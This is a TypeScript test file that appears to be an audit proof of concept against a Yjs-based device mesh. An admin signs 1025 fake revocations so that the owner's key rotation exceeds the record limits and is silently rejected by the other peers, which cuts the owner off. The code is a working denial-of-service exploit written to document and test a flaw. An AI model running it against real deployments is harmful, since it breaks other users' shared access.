// Round-4 audit PoC (passes while the attack works). rotate() never respects the receivers' record limits
// (isRotRecord: revoked/to/revs <= 1024). A tier-2 admin signs 1025 revocation requests (of made-up device ids: a
// target without an admission "counts as a member", and before the first rotation every revoked id is "exposed").
// The owner executes them in ONE rotation that every other device drops as malformed (silently, in parseRotate),
// while the owner adopts it locally: the owner ends alone on a key nobody else has, until some later re-key.
import * as Y from "yjs";
import { describe, expect, it } from "vitest";
import { signRevocation } from "../../src/web/admission.js";
import { createLoopbackHub } from "../../src/web/index.js";
import { b64uEncode, randomBytes } from "../../src/web/util.js";
import { makeDev, metaOf, pair, until } from "./helpers.js";

const settle = (ms: number) => new Promise((r) => setTimeout(r, ms));

describe("R4-2: an admin makes the owner's re-key unreadable for everybody else", () => {
	it("1025 signed requests -> malformed owner rotation -> owner isolated on its own key", async () => {
		const g = createLoopbackHub();
		const a = await makeDev("o", g);
		a.mesh.on("sas", (p) => p.confirm());
		const x = await makeDev("adm", g);
		const ox = await a.mesh.pairHost({ role: "admin" });
		await x.mesh.pairJoin(ox.payload, { confirmSas: () => true });
		const b = await makeDev("b", g);
		await pair(a, b);
		await until(() => [a, x, b].every((d) => d.mesh.peers.length === 2), 10_000);
		await until(() => [a, x, b].every((d) => [a, x, b].every((y) => metaOf(d).has(`ecdh/${y.id}`))), 10_000);
		const mid = (a.mesh.root as { mid: string }).mid;
		const t0 = Date.now();
		const recs = [];
		for (let i = 0; i < 1025; i++)
			recs.push(await signRevocation(x.vault, { mid, target: b64uEncode(randomBytes(32)), by: x.id, epoch: 1 }));
		console.log(`admin signed 1025 requests in ${Date.now() - t0} ms`);
		const bRej: string[] = [];
		b.mesh.on("rejected", (e) => bRej.push(e.reason));
		x.doc.transact(() => {
			for (const r of recs) metaOf(x).set(`rev/${r.target}:${r.epoch}`, r);
		});
		await until(() => a.mesh.epoch === 1, 60_000);
		await settle(8000);
		const recKeys = [...metaOf(a).keys()].filter((k) => k.startsWith("rotrec:"));
		const rec = metaOf(a).get(recKeys[0] as string);
		console.log(
			`owner epoch=${a.mesh.epoch} peers=${a.mesh.peers.length} | admin epoch=${x.mesh.epoch} | b epoch=${b.mesh.epoch} peers=${b.mesh.peers.length} | rot.revoked=${rec.revoked.length} revs=${rec.revs.length} | b rejected=${JSON.stringify([...new Set(bRej)])}`,
		);
		// ATTACK WORKS: the owner moved alone; the rest of the mesh never adopts its rotation
		expect(a.mesh.epoch).toBe(1);
		expect(b.mesh.epoch).toBe(0);
		expect(x.mesh.epoch).toBe(0);
		expect(a.mesh.peers).toHaveLength(0);
		// and data written by the owner no longer reaches b
		a.doc.getMap("data").set("k", "from-owner");
		await settle(1500);
		expect(b.doc.getMap("data").get("k")).toBeUndefined();
		void Y;
		for (const d of [a, x, b]) d.mesh.destroy();
	}, 180_000);
});
